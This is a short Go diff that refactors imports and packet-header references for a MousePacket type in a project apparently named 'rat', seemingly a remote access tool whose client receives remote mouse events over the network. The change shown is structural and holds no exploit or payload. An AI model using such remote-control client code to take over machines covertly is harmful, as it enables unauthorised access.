@@ -1,7 +1,9 @@
 package main
 
-import "rat/shared"
-import "rat/client/screen"
+import (
+	"rat/client/screen"
+	"rat/shared/network/header"
+)
 
 type MousePacket struct {
 	MonitorID   int `network:"receive"`
@@ -9,8 +11,8 @@ type MousePacket struct {
 	Type        int `network:"receive"`
 }
 
-func (packet MousePacket) Header() shared.PacketHeader {
-	return shared.MouseHeader
+func (packet MousePacket) Header() header.PacketHeader {
+	return header.MouseHeader
 }
 
 func (packet MousePacket) OnReceive() error {
